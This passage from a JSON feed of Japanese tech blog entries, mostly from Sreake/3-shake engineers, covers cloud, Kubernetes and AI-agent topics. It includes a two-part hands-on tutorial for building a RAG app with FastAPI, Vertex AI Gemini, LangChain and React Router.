CloudがTokoy・Osakaリージョンで利用可能になりました。 Oracle Databas […]The post Oracle Database＠Google Cloudの紹介～ついに日本のリージョンも使えるようになったぞ！～ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-06T10:48:27.000Z","dateMiliSeconds":1749206907000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク所属のエンジニアが「AWS Community Builders」に選出","link":"https://sreake.com/blog/aws-community-builders-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）に所属の鈴木 勝史が、「AWS Community Builders」に2年連続で選出されたことをお知らせします。The post スリーシェイク所属のエンジニアが「AWS Community Builders」に選出 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-02T01:00:00.000Z","dateMiliSeconds":1748826000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GoogleのAI Agent","link":"https://speakerdeck.com/shukob/googlenoai-agent","contentSnippet":"2025年5月30日(金) AI Agent 勉強会 Vol.3 にて、\\rGoogle CloudのAI Agentサービスと\\rGoogle I/O 2025 で発表された内容の概要を紹介させていただきました。\\rhttps://almondo.connpass.com/event/355297/","isoDate":"2025-05-30T04:00:00.000Z","dateMiliSeconds":1748577600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"スリーシェイク、「KubeCon + CloudNativeCon Japan 2025」にGoldスポンサーとして協賛およびブース出展","link":"https://sreake.com/blog/kubecon-cloudnativecon-japan-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 2025年6月16日（月）・17日（火）に開催される「KubeCon + CloudNativeCon Japan 2025」にGoldスポンサーとして協賛します。The post スリーシェイク、「KubeCon + CloudNativeCon Japan 2025」にGoldスポンサーとして協賛およびブース出展 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-29T01:00:00.000Z","dateMiliSeconds":1748480400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Dockerを使用せずにイメージを作成し実行してみる – go-containerregistryによる実装","link":"https://sreake.com/blog/image-creation-and-execution-with-go-containerregistry/","contentSnippet":"この記事ではコンテナイメージがどのように作成されているのかを、go-containerregistryライブラリを使った実装例を通して解説します。Dockerfileを使わずに、プログラムからコンテナイメージを作成する過 […]The post Dockerを使用せずにイメージを作成し実行してみる – go-containerregistryによる実装 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-29T00:40:36.000Z","dateMiliSeconds":1748479236000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、Google Cloud Next Tokyo にDiamondスポンサーとして協賛","link":"https://sreake.com/blog/google-cloud-next-tokyo-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2025 年 8 ⽉ 5 日（火）~\xa0 6 ⽇（水）に東京ビッグサイトにて開催される Google Cloud Next Tokyo\xa0 (主催：グーグル・クラウド・ジャパン合同会社) にDiamondスポンサーとして協賛いたします。The post スリーシェイク、Google Cloud Next Tokyo にDiamondスポンサーとして協賛 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-28T06:27:59.000Z","dateMiliSeconds":1748413679000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AIコードエディタは開発を変えるか？Cursorをチームに導入して1ヶ月経った本音","link":"https://speakerdeck.com/ota1022/aikodoedeitahakai-fa-wobian-eruka-cursorwotimunidao-ru-site1keyue-jing-tutaben-yin","contentSnippet":"2025年5月28日 Qiita Bash 最近ハマっている生成AI活用法を語ろう！のLT登壇資料です。\\rhttps://increments.connpass.com/event/351227/","isoDate":"2025-05-28T04:00:00.000Z","dateMiliSeconds":1748404800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"ディレクトリ構成 ~フィーチャーベース編~","link":"https://sreake.com/blog/feature-based-directory-structure-good-practice/","contentSnippet":"はじめに アプリケーション開発において、ディレクトリ構成は保守性・拡張性・開発効率に直結する設計要素です。 本記事では、以下のような課題に悩む現場に向けて、「機能ごとに整理しやすく、拡張にも強い」フィーチャーベース構成を […]The post ディレクトリ構成 ~フィーチャーベース編~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-28T02:18:09.000Z","dateMiliSeconds":1748398689000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RedisのPub/Subを使用したリアルタイム通知の実現","link":"https://sreake.com/blog/realtime-notification-with-redis-pubsub/","contentSnippet":"はじめに Sreake事業部のアプリケーションエンジニアの角谷です。 リアルタイム通信を実現する手段は様々ありますが、その一つにPub/Subがあります。 Pub/Subを実装する方法は様々ありますが、今回はRedisを […]The post RedisのPub/Subを使用したリアルタイム通知の実現 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-28T01:18:04.000Z","dateMiliSeconds":1748395084000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、「開発生産性Conference 2025」にGoldスポンサーとして協賛およびブース出展・登壇","link":"https://sreake.com/blog/developer-productivity-conference-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 2025年 7月3日（木）4日（金）に開催される「開発生産性Conference 2025」にGoldスポンサーとして協賛します。The post スリーシェイク、「開発生産性Conference 2025」にGoldスポンサーとして協賛およびブース出展・登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-27T01:00:00.000Z","dateMiliSeconds":1748307600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RAGアプリ開発ハンズオン（後編：フロントエンド編）","link":"https://shu-kob.hateblo.jp/entry/2025/05/26/185645","contentSnippet":"genai-users.connpass.com上記ハンズオン勉強会の資料になります。前回資料shu-kob.hateblo.jp前回の課題retriever_service を定義しましたが、検索結果をcontextとして、LLMへの問い合わせを行なってください。llm_serviceでretriever_serviceを使うようにします。@app.post(\'/api/llm\')def llm_service(question: Question):    human_question = question.query    model = VertexAI(model_name=\\"gemini-2.0-flash-001\\", location=\\"us-west1\\")    template = \\"\\"\\"質問: {question}    ステップバイステップで考えてください。\\"\\"\\"    prompt_template = PromptTemplate.from_template(template)    chain = prompt_template | model # prompt_templateをmodelに引き渡す処理を\\"|\\"を用いて簡単に実現    response = chain.invoke({\\"question\\": human_question}) # invokeは全ての処理が終わってから値を返す。他にはstreamなど    print(response)    resp = { \'answer\': response }    return resp↓@app.post(\'/api/llm\')def llm_service(question: Question):    human_question = question.query    model = VertexAI(model_name=\\"gemini-2.0-flash-001\\", location=\\"us-west1\\")    context_resp = retriever_service(question)    context = context_resp[\'search_result\']    print(context)    template = \\"\\"\\"質問: {question}    以下の情報を参考にして、質問に答えてください。    {context}    \\"\\"\\"    prompt_template = PromptTemplate.from_template(template)    chain = prompt_template | model # prompt_templateをmodelに引き渡す処理を\\"|\\"を用いて簡単に実現    response = chain.invoke({\\"question\\": human_question, \\"context\\": context}) # invokeは全ての処理が終わってから値を返す。他にはstreamなど    print(response)    resp = { \'answer\': response }    return resp以下も行っておくと便利です。.envを作成DISCOVERY_ENGINE_ID=XXXXXXXXXXXXX以下の行を main.pyに追記from dotenv import load_dotenvload_dotenv()engine_idの行を変更@app.post(\'/api/retriever\')def retriever_service(question: Question):    search_query = question.query    project_id    location: str = \\"global\\"    engine_id: str = \'DISCOVERY_ENGINE_ID\'↓@app.post(\'/api/retriever\')def retriever_service(question: Question):    search_query = question.query    project_id    location: str = \\"global\\"    engine_id: str = os.environ[\'DISCOVERY_ENGINE_ID\']動作確認QUESTION=\'{\\"query\\":\\"情報セキュリティにおいて気をつけるべきことを教えてください\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$QUESTION\\" -s http://localhost:8000/api/llm | jq .参考）ソースコード差分retriever_serviceで得た検索結果をcontextに by shu-kob \xb7 Pull Request #4 \xb7 shu-kob/rag-app-handson \xb7 GitHubフロントエンドの実装フォルダ整理これまでバックエンドを追加してきたのと同じリポジトリでフロントエンドも管理いたします。そのためにこれまで追加してきたファイルをバックエンド用のフォルダに移動させます。mkdir backend# 下記以外にも必要なファイル、フォルダはbackendに移動してください。# - __pycache__とfastapi-envは削除してください。# - .gitがある場合は移動も削除もしないでください。mv *.md *.py *.txt .env backendアプリ作成アプリの雛形を作成し、起動を確認します。npx --yes create-react-router@latest --install --no-git-init frontendcd frontendnpm run devブラウザでhttp://localhost:5173/を開いてReact Routerの画面が表示されればOKです。画面を変更してみる見た目を定義しているコンポーネントはfrontend/app/welcome/welcome.tsxです。Welcomeコンポーネントを以下のように変更します。export function Welcome() {  return (    <main className=\\"flex items-center justify-center pt-16 pb-4\\">      <div className=\\"flex-1 flex flex-col items-center gap-16 min-h-0\\">        <div>          <div>            <label htmlFor=\\"message\\">メッセージ</label>          </div>          <div>            <textarea              id=\\"message\\"              rows={4}              cols={50}              style={{                padding: \\"0.5rem\\",                border: \\"1px solid #ccc\\",                outline: \\"none\\",                boxShadow: \\"none\\",              }}            />          </div>          <div>            <button              type=\\"button\\"              style={{                border: \\"1px solid #ccc\\",                padding: \\"0.5rem 1rem\\",              }}            >              送信            </button>          </div>        </div>      </div>    </main>  );}画面に入力欄とボタンが表示されればOKです。入力をコントロールする上記で入力欄に文字を入力することはできますが、その値はブラウザ側で管理されており、Reactアプリ側では取得できません。そこでstateを用いてアプリ側で入力を制御します。import { useState } from \\"react\\";export function Welcome() {  const [input, setInput] = useState(\\"\\");  const onSend = () => {    console.log(input)  }  return (    <main className=\\"flex items-center justify-center pt-16 pb-4\\">      <div className=\\"flex-1 flex flex-col items-center gap-16 min-h-0\\">        <div>          <div>            <label htmlFor=\\"message\\">メッセージ</label>          </div>          <div>            <textarea              id=\\"message\\"              rows={4}              cols={50}              style={{                padding: \\"0.5rem\\",                border: \\"1px solid #ccc\\",                outline: \\"none\\",                boxShadow: \\"none\\",              }}              value={input}              onChange={(e) => setInput(e.target.value)}            />          </div>          <div>            <button              type=\\"button\\"              style={{                border: \\"1px solid #ccc\\",                padding: \\"0.5rem 1rem\\",              }}              onClick={onSend}            >              送信            </button>          </div>        </div>      </div>    </main>  );}テキストを入力して送信ボタンをクリックするとログにテキストの内容が表示されるようになります。ログの確認はブラウザの開発者ツールで行います。バックエンドとの接続フロントエンドはバックエンドと異なるオリジンで動かしているため、CORSエラーにならないようバックエンドを修正します。backend/main.pyに以下を追加してください。# CORSミドルウェアの設定from fastapi.middleware.cors import CORSMiddlewareapp.add_middleware(    CORSMiddleware,    allow_origins=[\\"*\\"],  # すべてのオリジンを許可    allow_credentials=True,    allow_methods=[\\"*\\"],  # すべてのメソッドを許可    allow_headers=[\\"*\\"],  # すべてのヘッダーを許可    expose_headers=[\\"*\\"]  # すべてのヘッダーを公開)変更後、バックエンドを起動します。python -m venv fastapi-envsource fastapi-env/bin/activateWindowsのコマンドプロンプトの場合fastapi-env/Scripts/activateuvicorn main:app --reload送信ボタンが押された際に入力されたテキストをバックエンドに送信し、生成AIの回答を取得できるようにします。レスポンスの確認はブラウザの開発者ツールで行います。  const onSend = () => {    fetch(\\"http://localhost:8000/api/llm\\", {      method: \\"POST\\",      headers: {        \\"Content-Type\\": \\"application/json\\",      },      body: JSON.stringify({ query: input }),    })  }演習バックエンドのResponseを画面に表示させましょう例バックエンドからのresponseをフロントエンドに表示 by shu-kob \xb7 Pull Request #6 \xb7 shu-kob/rag-app-handson \xb7 GitHub","isoDate":"2025-05-26T09:56:45.000Z","dateMiliSeconds":1748253405000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Vertex AI Agent Engine のカスタムテンプレートでセッション機能付きチャットボットを作る","link":"https://zenn.dev/kimitsu/articles/agent-angine-custom-agent","contentSnippet":"Vertex AI Agent Engine は AI エージェントを構築・デプロイするための Google Cloud のマネージドサービスです。[1]以下のフレームワークに対してはテンプレートが用意されており、簡単にデプロイすることができます。Agent Development KitLangChainLangGraphAG2LlamaIndexまた上記に挙げられていないフレームワークについても、カスタムテンプレートを作成することでデプロイすることができます。今回はカスタムテンプレートを用いて、セッション機能付きの AI チャットボットを実装してみます。なお本記...","isoDate":"2025-05-26T07:02:31.000Z","dateMiliSeconds":1748242951000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"TerragruntでTerraformをいい感じに管理する","link":"https://zenn.dev/kojake_300/articles/9b008349fa8310","contentSnippet":"はじめに皆さんはTerraformをどのような管理していますか？最近では、Google Cloudがベストプラクティス[1]を公開していたり、FUTURE社が設計ガイドライン[2]を提供していたりと、Terrafromの設計・開発ガイドラインは成熟して来ているのではないでしょうか。それでも、何となくもっと良い管理の方法はないかなあ？ と思ったことはありませんか。そんなTerraform Loverに送る、Terragruntというツールを紹介します。 Terraformの課題基本的なTerraformのディレクトリ構成を以下に示します。AWSリソースを管理することを想定と...","isoDate":"2025-05-25T14:05:00.000Z","dateMiliSeconds":1748181900000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Google Cloud の生成 AI オブザーバビリティ機能まとめ","link":"https://zenn.dev/kimitsu/articles/google-cloud-gen-ai-o11y","contentSnippet":"生成 AI アプリケーションにおけるオブザーバビリティの必要性ここ数年の生成 AI 技術の発展に伴い、RAG や AI エージェントなど生成 AI のアプリケーションへの応用が進んでいます。一方で生成 AI アプリケーションを本番利用していくにあたっては以下のような課題があります。確率的な挙動モデルの出力生成にかかる時間トークンに対する課金額外部サービス呼び出し（RAG であれば検索サービス、AI エージェントであればツール）実行経路（ワークフロー型エージェントの場合）モデルの更新、プロンプトの更新これらの課題に対し、生成 AI アプリケーションにおいて...","isoDate":"2025-05-24T09:01:25.000Z","dateMiliSeconds":1748077285000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Snowflakeで始めるデータガバナンス","link":"https://sreake.com/blog/getting-started-with-data-governance-in-snowflake/","contentSnippet":"はじめに データ分析において、データガバナンスは必要不可欠な取り組みの1つと言って過言ではないでしょう。 今回は「Snowflakeで始めるデータガバナンス」と題しまして、新規既存関係なく、どのタイミングからでも導入可能 […]The post Snowflakeで始めるデータガバナンス first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-23T01:15:59.000Z","dateMiliSeconds":1747962959000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Pod Resource動的リサイズの検証","link":"https://sreake.com/blog/kubernetes-pod-resource-dynamic-resize/","contentSnippet":"Kubernetesでは、アプリケーションの可用性や運用効率を高めるため、リソース変更時のダウンタイムを極力抑える取り組みが進んでいます。従来、CPU やメモリのリソースを変更する際には、Pod の再作成やコンテナ再起動 […]The post Pod Resource動的リサイズの検証 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-20T08:38:25.000Z","dateMiliSeconds":1747730305000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【ドキュメントを追え! mitmproxy編】 第1話 いかにして中間者になるかHTTP編","link":"https://www.rowicy.com/blog/mitmproxy_doc_read_01/","contentSnippet":"mitmproxyのドキュメントを読んで自分で調べた補足をまとめました","isoDate":"2025-05-20T00:00:00.000Z","dateMiliSeconds":1747699200000,"authorName":"riiim","authorId":"riiim"},{"title":"React Tokyo LT大会「ストリームの実装」","link":"https://speakerdeck.com/shukob/react-tokyo-ltda-hui-sutorimunoshi-zhuang","contentSnippet":"2025年5月17日React Tokyo LT大会にて、生成AIアプリケーションなどでよく使う「ストリーム実装」について話しました。\\rhttps://react-tokyo.connpass.com/event/350715/","isoDate":"2025-05-17T04:00:00.000Z","dateMiliSeconds":1747454400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google CloudのAI Agent関連のサービス紹介","link":"https://speakerdeck.com/shukob/google-cloudnoai-agentguan-lian-nosabisushao-jie","contentSnippet":"https://3-shake.connpass.com/event/351861/\\r3-shake SRE Tech Talk #12 にて、\\rGoogle CloudのAI Agent関連のサービス紹介を行いました\\r・Vertex AI Agent Builder\\r・Agent Garden\\r・Agent Engine\\r・Vertex AI Search\\r・Agentspace\\rなど","isoDate":"2025-05-16T04:00:00.000Z","dateMiliSeconds":1747368000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"学ぶ・つながる・挑戦する ~ 大学から始めるセキュリティの学び~/security_learning","link":"https://speakerdeck.com/moz_sec_/security-learning","contentSnippet":"2025年5月15日に行われたランチタイムトークで登壇した資料です。","isoDate":"2025-05-15T04:00:00.000Z","dateMiliSeconds":1747281600000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"転職したらMCPサーバーだった件","link":"https://speakerdeck.com/nwiizo/zhuan-zhi-sitaramcpsabadatutajian","contentSnippet":"本日、Forkwell さんに悪ふざけに付き合ってもらってイベントやりました。ありがとうございます。「転職したらMCPサーバーだった件」 \uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: 転職したらMCPサーバーだった件\\r- 公式URL: https://forkwell.connpass.com/event/354289/\\r- ハッシュタグ: https://x.com/search?q=%23Forkwell_MCP&f=live\\r- 参考資料①: https://speakerdeck.com/nwiizo/kokohamcpnoye-ming-kemae\\r- 参考資料②: https://syu-m-5151.hatenablog.com/entry/2025/03/09/020057\\r- 参考資料③: https://speakerdeck.com/superbrothers/that-time-i-changed-jobs-as-a-kubernetes","isoDate":"2025-05-15T04:00:00.000Z","dateMiliSeconds":1747281600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"AIエージェントのオブザーバビリティについて","link":"https://speakerdeck.com/yunosukey/aiezientonoobuzababiriteinituite","contentSnippet":"","isoDate":"2025-05-15T04:00:00.000Z","dateMiliSeconds":1747281600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"論文紹介『長文コンテキストLLMとRAGの連携：RAGにおける長文入力の課題克服』","link":"https://sreake.com/blog/introduction-long-context-llms-meet-rag/","contentSnippet":"RAG（Retrieval Augmented Generation）は、LLM（Large Language Model：大規模言語モデル）が知らない情報を外部から与えてあげることで、LLMの知識を拡張する手法です。R […]The post 論文紹介『長文コンテキストLLMとRAGの連携：RAGにおける長文入力の課題克服』 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-15T01:01:02.000Z","dateMiliSeconds":1747270862000,"authorName":"Sreake","authorId":"Sreake"},{"title":"OpenTelemetry + LLM = OpenLLMetry!?","link":"https://speakerdeck.com/yunosukey/opentelemetry-plus-llm-equals-openllmetry","contentSnippet":"","isoDate":"2025-05-14T04:00:00.000Z","dateMiliSeconds":1747195200000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"SSHの基本を理解したい(シーケンス図付き)","link":"https://zenn.dev/meziron/articles/a42cef62e06a68","contentSnippet":"1. 初回 SSH 接続時の流れ (秘密鍵のパスフレーズ入力あり)このシナリオでは、ユーザーが初めて特定のサーバーに SSH 接続を試みるか、あるいは SSH エージェントにまだ該当の秘密鍵がロードされていない状況を想定します。秘密鍵はパスフレーズで保護されているものとします。 登場人物User: 操作を行うユーザーSSH_Client: ユーザーが操作する SSH クライアント（例: sshコマンド）SSH_Agent: SSH エージェントプロセス（秘密鍵をメモリに保持）SSH_Server: 接続先の SSH サーバー 初回接続時の流れのポイント...","isoDate":"2025-05-12T00:00:05.000Z","dateMiliSeconds":1747008005000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"GitHub Actionsから踏み台経由でプライベートCloud SQLに接続 (OS Login + WIF + SSHトンネル編)","link":"https://zenn.dev/meziron/articles/369504c9d84eba","contentSnippet":"GitHub Actionsから踏み台サーバー経由でプライベートCloud SQLに接続する実践ガイド (OS Login + WIF + SSHトンネル編)CI/CDパイプライン、特にGitHub Actionsから、VPCのプライベートネットワーク内に配置されたCloud SQLデータベースへ安全かつ自動的に接続したい、というニーズは多いのではないでしょうか？この記事では、Workload Identity Federation (WIF), OS Login そして gcloud compute ssh (beta) を組み合わせた、管理しやすい接続方法を解説します。 1...","isoDate":"2025-05-08T08:55:26.000Z","dateMiliSeconds":1746694526000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"クラウドネイティブ環境の脅威モデリング","link":"https://speakerdeck.com/kyohmizu/kuraudoneiteibuhuan-jing-noxie-wei-moderingu","contentSnippet":"イベント登壇資料です。2025/05/08 #TMCTokyo\\rhttps://lu.ma/tmc-tokyo-meetup-2025-05","isoDate":"2025-05-08T04:00:00.000Z","dateMiliSeconds":1746676800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"FastAPIのエラーハンドリングの基本と、ハンドリング漏れ対策","link":"https://sreake.com/blog/fastapi-error-handling-basics/","contentSnippet":"こんにちは。Sreake事業部の安本篤史（atusy）です。 APIサーバーの実装では、プログラムエラーをハンドリングして、クライアントエラーやサーバーエラーを適切にレスポンスすることが求められます。 同時に、エラーに関 […]The post FastAPIのエラーハンドリングの基本と、ハンドリング漏れ対策 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-08T03:03:29.000Z","dateMiliSeconds":1746673409000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Argo CDのセットアップ方法を解説してみる","link":"https://zenn.dev/kamos/articles/0e1e6af0700f14","contentSnippet":"はじめにArgo CDとは、Kubernetesのための継続的デリバリー（CD）ツールです。GitOpsの原則に従い、Gitリポジトリの状態をKubernetesクラスターに同期させることができます。これにより、アプリケーションのデプロイメントや管理が容易になります。Kubernetes環境では広く利用されているArgo CDですが、Argo CD自体のセットアップ方法はいくつかの方法があります。ここでは、Argo CDの初期セットアップについて解説します。 Argo CDの初期セットアップArgo CDを利用可能にするには、以下の手順が必要になります。Argo CD ...","isoDate":"2025-05-07T02:18:03.000Z","dateMiliSeconds":1746584283000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"A2AサーバをOpenTelemetryで計装する","link":"https://zenn.dev/kimitsu/articles/otel-and-a2a","contentSnippet":"A2A におけるオブザーバビリティの必要性A2A[1]は Google が主導し開発を進めている、エージェント間の通信を可能にするオープンプロトコルです。A2A を利用することで生成 AI アプリケーションはマルチエージェントシステムとして実装されます。マルチエージェントシステムは分散システムであり、マイクロサービスと同様にオブザーバビリティが重要となります。小さなエージェントであればわざわざ A2A でクライアントとサーバに分ける必要はありませんが、エージェントが巨大化すれば従来の Web アプリケーションの潮流と同様に分割される方向で進化するでしょう。本記事ではA2Aサ...","isoDate":"2025-05-05T10:46:15.000Z","dateMiliSeconds":1746441975000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"MCPサーバをOpenTelemetryで計装する","link":"https://zenn.dev/kimitsu/articles/otel-and-mcp","contentSnippet":"MCP におけるオブザーバビリティの必要性MCP の利用方法として現時点では以下がよくあると思います。MCP サーバをローカルで動かしているサードパーティーのリモートサーバを使っているクライアントがローカルアプリ上記の場合にはオブザーバビリティは比較的重要ではありません。一方で、以下のような場合にはMCP においてもオブザーバビリティが重要です。Web アプリケーションが MCP クライアント（例えば生成 AI アプリ）MCP サーバを自作しているこのような状況では MCP クライアントと MCP サーバは、マイクロサービスで構成されたアプリケーションとして...","isoDate":"2025-05-05T07:33:24.000Z","dateMiliSeconds":1746430404000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"PR概要作成・コード改善提案ツール PR-Guardianのご紹介","link":"https://sreake.com/blog/pr-guardian-introduction/","contentSnippet":"はじめに はじめまして、Sreake事業部でインターンをしている村山です。 今回は、PR Guardianというツールの開発と検証をしました。PR GuardianはPull Requestの概要の作成、コードの改善提案 […]The post PR概要作成・コード改善提案ツール PR-Guardianのご紹介 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-30T08:07:36.000Z","dateMiliSeconds":1746000456000,"authorName":"Sreake","authorId":"Sreake"},{"title":"NVIDIA NIMを使ってみた","link":"https://sreake.com/blog/trying-out-nvidia-nim/","contentSnippet":"NIMとは NVIDIA Inference Microservicesの頭文字をとってNIMです。迅速なエンタープライズ対応デプロイメントのためのマイクロサービスを提供してくれます。NVIDIAのGPUで動かすことに最 […]The post NVIDIA NIMを使ってみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-30T06:13:57.000Z","dateMiliSeconds":1745993637000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RustでLSMツリーを実装してみた","link":"https://zenn.dev/sraku/articles/25ead9b5012c15","contentSnippet":"概要CassandraやScyllaDBといったKVSで使用されているLSMツリーを簡単に実装してみたので、簡単にお話ししていきたいと思いますこちらがリポジトリですhttps://github.com/sraku2159/lsmtree実装のお話をする前に簡単にLSMツリーについてお話ししていきたいと思います LSMツリーとはLSMツリーとはLog Structre Merge ツリーの略で以下の四つのコンポーネントから構成されます。MemtableCommitLogSSTableコンパクション以下、ScyllaDBのちょー親切なドキュメントから拝借した画...","isoDate":"2025-04-29T10:09:14.000Z","dateMiliSeconds":1745921354000,"authorName":"Sota Nakano","authorId":"sraku"},{"title":"RAGアプリ開発ハンズオン（前編：バックエンド編）","link":"https://shu-kob.hateblo.jp/entry/2025/04/28/185621","contentSnippet":"genai-users.connpass.com上記ハンズオン勉強会の資料になります。ソースコードgithub.comFastAPIの準備python -m venv fastapi-envsource fastapi-env/bin/activateWindowsのコマンドプロンプトの場合fastapi-env/Scripts/activatepip install fastapi uvicorntouch main.pyfrom fastapi import FastAPIapp = FastAPI()@app.get(\'/\')def index():  return \'hello\'実行uvicorn main:app --reload別ターミナルにてcurl -s http://localhost:8000/POSTも追加from pydantic import BaseModelclass User(BaseModel):    name: str@app.post(\'/api/hello\')def hello_service(user: User):    resp = { \'message\': \'Hello, {}!\'.format(user.name) }    return respUSER=\'{\\"name\\":\\"平賀源内\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$USER\\" -s http://localhost:8000/api/hello | jq .Google Cloudでサービスアカウントの準備Geminiマルチモーダルプログラミングハンズオン - Toilを無くして徒然なるままに日暮し硯に向かひたいの記事を参考に、ロールへVertex AI ユーザーディスカバリー エンジン ユーザーを追加し、環境変数の設定Geminiを呼び出すコードを記載main.pyの上に以下を追加import vertexaifrom vertexai.generative_models import GenerativeModelmain.pyの下に以下を追加class Question(BaseModel):    query: str@app.post(\'/api/llm\')def llm_service(question: Question):    prompt = question.query    vertexai.init(location=\\"us-west1\\") # vertexaiの初期化で、ロケーションを設定    model = GenerativeModel(\\"gemini-2.0-flash-001\\") # モデルを設定    response = model.generate_content( # プロンプトをモデルに入れて出力(レスポンスを得る)        prompt    )    print(response.text) # コンソールログにresponseのテキストを表示    resp = { \'answer\': response.text } # responseを形作る    return respライブラリのインストールrequirements.txtに以下を記載google-cloud-aiplatform==1.83.0vertexai==1.43.0langchain_core==0.3.33langchain_google_vertexai==2.0.12google===3.0.0google-cloud-discoveryengine==0.13.6pip install -r requirements.txt--break-system-packagesをつけよ、とエラーが出たら以下pip install --user -r requirements.txt --break-system-packages実行方法uvicorn main:app --reload別ターミナルにてQUESTION=\'{\\"query\\":\\"プロンプトエンジニアリングとは何ですか？\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$QUESTION\\" -s http://localhost:8000/api/llm | jq .LangChainを用いるimport vertexai # 削除from vertexai.generative_models import GenerativeModel # 削除from langchain_google_vertexai import VertexAI # 追記from langchain_core.prompts import PromptTemplate # 追記@app.post(\'/api/llm\')def llm_service(question: Question):    human_question = question.query    model = VertexAI(model_name=\\"gemini-2.0-flash-001\\", location=\\"us-west1\\")    template = \\"\\"\\"質問: {question}    ステップバイステップで考えてください。\\"\\"\\"    prompt_template = PromptTemplate.from_template(template)    chain = prompt_template | model # prompt_templateをmodelに引き渡す処理を\\"|\\"を用いて簡単に実現    response = chain.invoke({\\"question\\": human_question}) # invokeは全ての処理が終わってから値を返す。他にはstreamなど    print(response)    resp = { \'answer\': response }    return respRAG構築Google Cloud Vertex AI Agent Builderの使い方 - Toilを無くして徒然なるままに日暮し硯に向かひたいの記事を参考に、Google Cloud Storageにドキュメントを格納し、Agent Builderで検索アプリを作ります。main.pyの上に追記from google.api_core.client_options import ClientOptionsfrom google.cloud import discoveryengine_v1 as discoveryengineimport osimport google.authcredentials, project_id = google.auth.default()main.pyの下に追記\'DISCOVERY_ENGINE_ID\'を書き換えます@app.post(\'/api/retriever\')def retriever_service(question: Question):    search_query = question.query    project_id    location: str = \\"global\\"    engine_id: str = \'DISCOVERY_ENGINE_ID\' # AI Applicationsで作成したアプリケーションのIDに変更する    def search(        project_id: str,        location: str,        engine_id: str,        search_query: str,    ) -> discoveryengine.services.search_service.pagers.SearchPager:        client_options = (            ClientOptions(api_endpoint=f\\"{location}-discoveryengine.googleapis.com\\")            if location != \\"global\\"            else None        )        client = discoveryengine.SearchServiceClient(client_options=client_options)        serving_config = f\\"projects/{project_id}/locations/{location}/collections/default_collection/engines/{engine_id}/servingConfigs/default_config\\"        content_search_spec = discoveryengine.SearchRequest.ContentSearchSpec(            snippet_spec=discoveryengine.SearchRequest.ContentSearchSpec.SnippetSpec(                return_snippet=True            ),            summary_spec=discoveryengine.SearchRequest.ContentSearchSpec.SummarySpec(                summary_result_count=3,                include_citations=True,                ignore_adversarial_query=True,                ignore_non_summary_seeking_query=True,                model_prompt_spec=discoveryengine.SearchRequest.ContentSearchSpec.SummarySpec.ModelPromptSpec(                    preamble=\\"文献の検索結果を要約してください\\"                ),                model_spec=discoveryengine.SearchRequest.ContentSearchSpec.SummarySpec.ModelSpec(                    version=\\"stable\\",                ),            ),        )        request = discoveryengine.SearchRequest(            serving_config=serving_config,            query=search_query,            page_size=3,            content_search_spec=content_search_spec,            query_expansion_spec=discoveryengine.SearchRequest.QueryExpansionSpec(                condition=discoveryengine.SearchRequest.QueryExpansionSpec.Condition.AUTO,            ),            spell_correction_spec=discoveryengine.SearchRequest.SpellCorrectionSpec(                